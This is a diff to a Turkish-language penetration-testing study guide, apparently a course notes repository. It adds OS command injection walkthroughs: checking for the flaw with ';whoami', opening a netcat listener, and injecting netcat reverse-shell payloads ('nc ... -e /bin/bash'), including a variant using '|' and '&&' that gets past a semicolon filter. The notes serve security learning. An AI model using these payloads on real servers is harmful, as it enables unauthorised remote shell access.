@@ -34,7 +34,8 @@
   - [Os Command Injection low level](#Os-Command-Injection-low-level)
   - [Os Command Injection medium level](#Os-Command-Injection-medium-level)
   - [Commix](#Commix)
-  - [SSI Injection](#SSI-Injection)
+  - [SSI Injection low level](#SSI-Injection-low-level)
+  - [SSI Injection medium level](#SSI-Injection-medium-level)
 
 # IP Çeşitleri
 > ## Public IP 
@@ -320,3 +321,25 @@ weevely <fotoğrafın yüklendiği konum><password> -> .php dosyasını kullanar
 # Kod Çalıştırma & SSI
 
 > ## Os Command Injection low level
+
+- Sunucuda komut çalıştımamızı sağlayan zafiyettir
+- ```Burpsuite``` içinde ```ıntercept is on``` yapıyoruz, web sitesinden look up diyoruz
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/main/Pictures/WhatsApp%20Image%202022-09-09%20at%2014.38.23.jpeg)
+- Siteye yolladığımız url sonunda ```;whoami``` ekleyip deniyoruz, eğer çalışırsa açık var demektir
+- ```nc -nvlp 1234``` çalıştırıyoruz
+- Siteye yolladığımız url sonuna ```;nc 192.168.123.123 1234 -e /bin/bash``` ekliyoruz 
+- Terminalimizi açıp açılan shell üzerinden server içinde dolaşabiliriz
+
+> ## Os Command Injection medium level
+
+- Bazı siteler ";" ile yazdığımız komutları filterlerip ";"'lleri silebilir çalışmaya biliri 
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2014.38.23.jpeg)
+- Aynı anda iki komut çalıştırmamızın başka yollarıda vardır;
+  - ```www.nsa.gov|pwd``` deneyebiliriz ya da ```www.nsa.goc&&pwd``` deneyebiliriz 
+  - ```"|" ve "&&" aynı ";" gibi işimize yarar```
+- ```nc -nvlp 1234``` çalıştırıp
+- ```www.nsa.gov | nc 192.168.123.123 1234 -e /bin/bash``` diyerek giriş yapabiliriz ve terminal üzerinden server'da dolaşabiliriz
+
+> ## Commix
+> ## SSI Injection low level
+> ## SSI Injection medium level
